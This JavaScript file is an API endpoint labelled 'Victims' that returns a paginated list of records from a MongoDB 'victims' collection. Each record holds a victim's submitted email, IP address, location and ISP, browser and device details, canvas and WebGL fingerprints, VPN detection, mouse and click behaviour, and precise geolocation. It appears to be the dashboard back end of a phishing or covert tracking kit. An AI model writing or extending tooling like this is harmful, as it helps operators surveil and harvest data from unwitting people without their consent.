/**
 * Victims API Endpoint
 *
 * Provides paginated list of victims
 *
 * GET /api/victims?page=1&limit=20&sort=-timestamp
 */

import { getVictimsCollection } from './_mongodb.js';

/**
 * Parse sort parameter
 * @param {string} sortParam
 * @returns {Object}
 */
function parseSortParam(sortParam) {
  if (!sortParam) return { timestamp: -1 };

  const direction = sortParam.startsWith('-') ? -1 : 1;
  const field = sortParam.replace(/^-/, '');

  return { [field]: direction };
}

/**
 * Main handler
 */
export default async function handler(req, res) {
  // Only allow GET
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const collection = await getVictimsCollection();

    // Parse query parameters
    const page = parseInt(req.query.page) || 1;
    const limit = Math.min(parseInt(req.query.limit) || 20, 100); // Max 100 per page
    const sort = parseSortParam(req.query.sort);
    const skip = (page - 1) * limit;

    // Get total count
    const totalRecords = await collection.countDocuments();

    // Fetch victims with pagination
    const victims = await collection
      .find({})
      .sort(sort)
      .skip(skip)
      .limit(limit)
      .toArray();

    // Format victims for response
    const formattedVictims = victims.map((v) => ({
      _id: v._id,
      timestamp: v.timestamp,
      email: v.metadata?.formData?.email || 'N/A',
      ip: v.network?.ip || 'Unknown',
      city: v.network?.city || 'Unknown',
      country: v.network?.country_name || 'Unknown',
      region: v.network?.region || 'Unknown',
      timezone: v.network?.timezone || 'Unknown',
      isp: v.network?.isp || 'Unknown',
      browser: `${v.browser?.name || 'Unknown'} ${v.browser?.version || ''}`,
      os: `${v.os?.name || 'Unknown'} ${v.os?.version || ''}`,
      device: v.device?.type || 'Unknown',
      platform: v.device?.platform || 'Unknown',
      screen: v.screen?.resolution || 'Unknown',
      timeOnPage: v.behavior?.timeOnPage || 0,
      mouseMovements: v.behavior?.mouseMovements || 0,
      clicks: v.behavior?.clicks || 0,
      scrolls: v.behavior?.scrolls || 0,
      fingerprint: v.fingerprint || 'Unknown',
      canvasFingerprint: v.fingerprints?.canvas || 'N/A',
      webglRenderer: v.fingerprints?.webgl?.renderer || 'N/A',
      vpnLikely: v.network?.vpnDetection?.likelyVPN || false,
      vpnConfidence: v.network?.vpnDetection?.confidence || 'low',
      geolocation: v.geolocation
        ? {
            lat: v.geolocation.latitude,
            lng: v.geolocation.longitude,
            accuracy: v.geolocation.accuracy,
          }
        : null,
    }));

    // Calculate pagination info
    const totalPages = Math.ceil(totalRecords / limit);

    return res.status(200).json({
      victims: formattedVictims,
      pagination: {
        currentPage: page,
        totalPages,
        totalRecords,
        hasNext: page < totalPages,
        hasPrev: page > 1,
        perPage: limit,
      },
    });
  } catch (error) {
    console.error('Victims error:', error);
    return res.status(500).json({
      error: 'Internal server error',
      message: error.message,
    });
  }
}
